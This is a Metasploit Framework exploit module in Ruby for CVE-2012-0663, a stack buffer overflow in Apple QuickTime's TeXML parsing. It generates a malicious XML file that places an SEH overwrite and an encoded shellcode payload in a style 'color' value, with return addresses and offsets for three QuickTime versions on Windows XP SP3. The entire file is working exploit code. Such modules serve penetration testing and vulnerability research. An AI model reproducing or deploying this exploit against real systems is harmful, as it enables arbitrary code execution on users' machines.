##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Apple QuickTime TeXML Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a vulnerability found in Apple QuickTime. When handling
				a TeXML file, it is possible to trigger a stack-based buffer overflow, and then
				gain arbitrary code execution under the context of the user.  The flaw is
				generally known as a bug while processing the 'transform' attribute, however,
				that attack vector seems to only cause a TerminateProcess call due to a corrupt
				stack cookie, and more data will only trigger a warning about the malformed XML
				file.  This module exploits the 'color' value instead, which accomplishes the same
				thing.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Alexander Gavrun',  # Vulnerability Discovery
					'sinn3r',            # Metasploit Module
					'juan vazquez'       # Metasploit Module
				],
			'References'     =>
				[
					[ 'OSVDB', '81934' ],
					[ 'CVE', '2012-0663' ],
					[ 'BID', '53571' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-095/' ],
					[ 'URL', 'http://support.apple.com/kb/HT1222' ]
				],
			'Payload'        =>
				{
					'DisableNops' => true,
					'BadChars'    => "\x00\x23\x25\x3c\x3e\x7d"
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'QuickTime 7.7.1 on Windows XP SP3',
						{
							'Ret' => 0x66f1bdf8, # POP ESI/POP EDI/RET from QuickTime.qts (7.71.80.42)
							'Offset' => 643,
							'Max' => 13508
						}
					],
					[ 'QuickTime 7.7.0 on Windows XP SP3',
						{
							'Ret' => 0x66F1BD66, # PPR from QuickTime.qts (7.70.80.34)
							'Offset' => 643,
							'Max' => 13508
						}
					],
					[ 'QuickTime 7.6.9 on Windows XP SP3',
						{
							'Ret' => 0x66801042, # PPR from QuickTime.qts (7.69.80.9)
							'Offset' => 643,
							'Max' => 13508
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'May 15 2012'))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.xml']),
			], self.class)
	end

	def exploit
		my_payload = rand_text(target['Offset'])
		my_payload << generate_seh_record(target.ret)
		my_payload << payload.encoded
		my_payload << rand_text(target['Max'] - my_payload.length)

		texml = <<-eos
		<?xml version="1.0"?>
		<?quicktime type="application/x-quicktime-texml"?>

		<text3GTrack trackWidth="176.0" trackHeight="60.0" layer="1"
			language="eng" timeScale="600"
			transform="matrix(1.0, 0.0, 0.0, 0.0, 1.0, 0.0, 1, 0, 1.0)">
			<sample duration="2400" keyframe="true">

				<description format="tx3g" displayFlags="ScrollIn"
					horizontalJustification="Left"
					verticalJustification="Top"
					backgroundColor="0%, 0%, 0%, 100%">

					<defaultTextBox x="0" y="0" width="176"  height="60"/>
					<fontTable>
						<font id="1" name="Times"/>
					</fontTable>

					<sharedStyles>
					<style id="1">
						{font-table: 1} {font-size:  10}
						{font-style:normal}
						{font-weight: normal}
						{color: #{my_payload}%, 100%, 100%, 100%}
					</style>
					</sharedStyles>
				</description>

				<sampleData scrollDelay="200"
					highlightColor="25%, 45%, 65%, 100%"
					targetEncoding="utf8">

					<textBox x="10" y="10" width="156"  height="40"/>
						<text styleID="1">What you need... Metasploit!</text>
						<highlight startMarker="1" endMarker="2"/>
						<blink startMarker="3" endMarker="4"/>
				</sampleData>
			</sample>
		</text3GTrack>
		eos

		texml = texml.gsub(/^\t\t/,'')

		print_status("Creating '#{datastore['FILENAME']}'.")
		file_create(texml)
	end

end
